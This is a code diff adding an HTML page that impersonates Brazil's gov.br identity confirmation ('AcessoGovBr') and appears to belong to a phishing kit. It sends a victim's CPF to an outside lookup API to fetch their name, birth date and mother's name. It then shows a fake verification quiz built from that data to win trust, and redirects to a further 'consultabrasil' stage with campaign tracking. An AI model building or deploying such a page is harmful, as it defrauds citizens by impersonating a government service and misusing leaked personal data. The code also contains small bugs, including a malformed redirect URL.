@@ -1,0 +1,308 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirmação de identidade - AcessoGovBr</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      user-select: none;
+    }
+
+    body {
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+    }
+
+    .selected {
+      background-color: #007bff;
+      color: white !important;
+    }
+
+    #spinner {
+      display: none;
+      align-items: center;
+      justify-content: center;
+    }
+  </style></head>
+  
+  <body>
+    <header class="fixed py-5 bg-white z-50 border-b shadow-lg">
+      <img src="images/menu.png" alt="" class="w-full">
+    </header>
+
+    <section class="p-5 w-full pt-32">
+      <div class="flex items-center justify-center mb-5">
+        <span class="w-7 h-7 rounded-full text-blue-900/40 bg-white border flex items-center justify-center">
+          1
+        </span>
+        <div class="w-8 h-px bg-gray-300"></div>
+        <span class="w-7 h-7 rounded-full text-white bg-blue-800 flex items-center justify-center">
+          2
+        </span>
+        <div class="w-8 h-px bg-gray-300"></div>
+        <span class="w-7 h-7 rounded-full text-blue-900/40 bg-white border flex items-center justify-center">
+          3
+        </span>
+      </div>
+
+      <h1 class="text-sm font-semibold">
+        Para continuarmos é necessário a validação dos dados:
+      </h1>
+
+      <div role="status" id="spinner" class="visually-hidden" style="display: none;">
+        <svg aria-hidden="true" class="w-8 h-8 text-gray-200 animate-spin fill-blue-600" viewBox="0 0 100 101" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z" fill="currentColor"></path>
+          <path d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z" fill="currentFill"></path>
+        </svg>
+        <span class="sr-only">Loading...</span>
+      </div>
+
+      <div id="questionsContainer"></div>
+    </section>
+
+    <footer class="min-h-[70px] bg-gray-50 border-t p-5 flex justify-center flex-col text-white text-sm font-normal">
+      <button id="continueButton" class="w-full bg-blue-800 text-white font-bold py-2 px-4 rounded-3xl hover:bg-blue-700 transition duration-300 ease-in-out" onclick="validateSelections()">
+        CONTINUAR
+      </button>
+    </footer>
+
+    <script>
+      let correctAnswers = {};
+
+      function getParameterByName(name, url = window.location.href) {
+        name = name.replace(/[\[\]]/g, "\\$&");
+        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+          results = regex.exec(url);
+        if (!results) return null;
+        if (!results[2]) return "";
+        return decodeURIComponent(results[2].replace(/\+/g, " "));
+      }
+
+      function shuffleArray(array) {
+        for (let i = array.length - 1; i > 0; i--) {
+          const j = Math.floor(Math.random() * (i + 1));
+          [array[i], array[j]] = [array[j], array[i]]; // Swap elements
+        }
+      }
+
+      function generateOptions(correctOption, type) {
+        const options = new Set([correctOption.toUpperCase()]); // Garante que a opção correta esteja sempre incluída e convertida para maiúsculas
+
+        if (type === "mes") {
+          const meses = [
+            "Janeiro",
+            "Fevereiro",
+            "Março",
+            "Abril",
+            "Maio",
+            "Junho",
+            "Julho",
+            "Agosto",
+            "Setembro",
+            "Outubro",
+            "Novembro",
+            "Dezembro",
+          ];
+          while (options.size < 5) {
+            // Continua a adicionar até ter 5 opções para meses
+            const option = meses[Math.floor(Math.random() * meses.length)];
+            options.add(option.toUpperCase());
+          }
+        } else if (type === "dia") {
+          while (options.size < 5) {
+            // Continua a adicionar até ter 5 opções para dias
+            const option = ("0" + (Math.floor(Math.random() * 30) + 1)).slice(
+              -2
+            );
+            options.add(option);
+          }
+        } else {
+          // Nomes femininos
+          const nomesFemininos = [
+            "MARIA APARECIDA DE OLIVEIRA",
+            "TEREZINHA ALVES DA CRUZ",
+            "LUCIA DA SILVA OLIVEIRA",
+            "SIMONE APARECIDA DA COSTA CUNHA",
+            "JULIA GOMES DE SOUZA",
+            "VILMA RODRIGUES CORREA",
+            "SONIA DA SILVA MACHADO",
+            "ANA ALVES PEREIRA",
+            "OLINDA DE SOUZA LUZ",
+            "ANGELICA RIBEIRO MARTINS",
+          ];
+          while (options.size < 4) {
+            // Ajuste para 4 para deixar espaço para "NENHUMA DAS ALTERNATIVAS"
+            const option =
+              nomesFemininos[Math.floor(Math.random() * nomesFemininos.length)];
+            options.add(option.toUpperCase());
+          }
+          const optionsArray = Array.from(options);
+          shuffleArray(optionsArray); // Embaralha as opções
+          optionsArray.push("NENHUMA DAS ALTERNATIVAS"); // Adiciona "NENHUMA DAS ALTERNATIVAS" como a última opção para nomes femininos
+          return optionsArray;
+        }
+
+        // Para meses e dias, apenas converte o conjunto em um array e embaralha
+        const optionsArray = Array.from(options);
+        shuffleArray(optionsArray);
+        return optionsArray;
+      }
+
+      function addQuestions(nome, dia, mes, mae) {
+        const questionsContainer =
+          document.getElementById("questionsContainer");
+
+        const maeOptions = generateOptions(mae, "nome");
+        const mesOptions = generateOptions(mes, "mes");
+        const diaOptions = generateOptions(dia, "dia");
+
+        const questions = [
+          {
+            label: "1. Qual o primeiro nome da sua mãe?",
+            options: maeOptions,
+            id: "mae",
+          },
+          {
+            label: "2. Qual o seu mês de nascimento?",
+            options: mesOptions,
+            id: "mes",
+          },
+          {
+            label: "3. Qual o seu dia de nascimento?",
+            options: diaOptions,
+            id: "dia",
+          },
+        ];
+
+        questions.forEach((question, index) => {
+          let questionHTML = `<div class="flex flex-col mt-5">
+      <label class="text-sm font-normal text-gray-600">${question.label}</label>
+      <div class="flex flex-col gap-2 mt-3" id="group-${question.id}">`;
+
+          question.options.forEach((option) => {
+            questionHTML += `<button onclick="selectOption(this, 'group-${question.id}')" class="option-button w-full border p-1 rounded-2xl font-medium text-blue-500 border-blue-700">${option}</button>`;
+          });
+
+          questionHTML += `</div></div>`;
+          questionsContainer.innerHTML += questionHTML;
+        });
+      }
+
+      function selectOption(selectedButton, groupId) {
+        // Remove a classe 'selected' de todos os botões no grupo
+        document
+          .querySelectorAll(`#${groupId} .option-button`)
+          .forEach((button) => {
+            button.classList.remove("selected");
+          });
+
+        // Adiciona a classe 'selected' ao botão clicado
+        selectedButton.classList.add("selected");
+      }
+
+      async function fetchCPFData() {
+        document.getElementById("spinner").style.display = "flex"; // Mostra o spinner
+
+        const cpf = getParameterByName("cpf");
+        await fetch(`https://api-typebot-ten.vercel.app/validate-cpf?cpf=${cpf}`)
+          .then((response) => response.json())
+          .then((data) => {
+            let { nome, dia, mes, mae } = data;
+
+            if (!mae.trim()) {
+              const nomesFemininos = [
+                "Ana",
+                "Maria",
+                "Clara",
+                "Luiza",
+                "Fernanda",
+                "Camila",
+                "Aline",
+                "Juliana",
+                "Mariana",
+                "Gabriela",
+              ];
+              mae =
+                nomesFemininos[
+                  Math.floor(Math.random() * nomesFemininos.length)
+                ];
+              correctAnswers.mae = "NENHUMA DAS ALTERNATIVAS";
+            } else {
+              correctAnswers.mae = mae.toUpperCase();
+            }
+
+            correctAnswers.nome = nome.toUpperCase();
+            correctAnswers.dia = dia.toString();
+            correctAnswers.mes = mes.toString();
+
+            addQuestions(nome, dia, mes, mae);
+
+            document.getElementById("spinner").style.display = "none"; // Oculta o spinner após carregar os dados
+          })
+          .catch((error) => {
+            console.error("Erro ao buscar dados do CPF:", error);
+            document.getElementById("spinner").style.display = "none"; // Oculta o spinner em caso de erro
+          });
+      }
+
+      function validateSelections() {
+        const mesSelected =
+          document
+            .querySelector("#group-mes .selected")
+            ?.innerText.toUpperCase() || "";
+        const diaSelected =
+          document.querySelector("#group-dia .selected")?.innerText || "";
+
+        // Verifica se as respostas selecionadas correspondem às respostas corretas
+        const isMesMatch = mesSelected === correctAnswers.mes.toUpperCase();
+        const isDiaMatch = diaSelected === correctAnswers.dia;
+
+        if (isMesMatch && isDiaMatch) {
+          const numeroCPF = getParameterByName("cpf");
+          const utmSource = getParameterByName("utm_source");
+          const utmCampaign = getParameterByName("utm_campaign");
+          const utmMedium = getParameterByName("utm_medium");
+          const utmContent = getParameterByName("utm_content");
+
+          var redirectURL =
+            "/acesso/consultabrasil?cpf=" +
+            encodeURIComponent(numeroCPF) +
+            "utm_source=" +
+            utmSource +
+            "&utm_campaign=" +
+            utmCampaign +
+            "&utm_medium=" +
+            utmMedium +
+            "&utm_content=" +
+            utmContent;
+
+          // Adiciona parâmetros existentes na URL atual à nova URL
+          var parametrosAtuais = window.location.search.substring(1);
+          if (parametrosAtuais) {
+            redirectURL += "&" + parametrosAtuais
+          }
+
+          window.location.href = redirectURL;
+        } else {
+          // Se alguma resposta estiver incorreta, mostra um alerta
+          alert(
+            "Algumas respostas estão incorretas. Por favor, tente novamente."
+          );
+        }
+      }
+
+      window.onload = function () {
+        fetchCPFData();
+      };
+
+      window.onload = function () {
+        fetchCPFData();
+      };
+    </script>
+  
+</body></html>
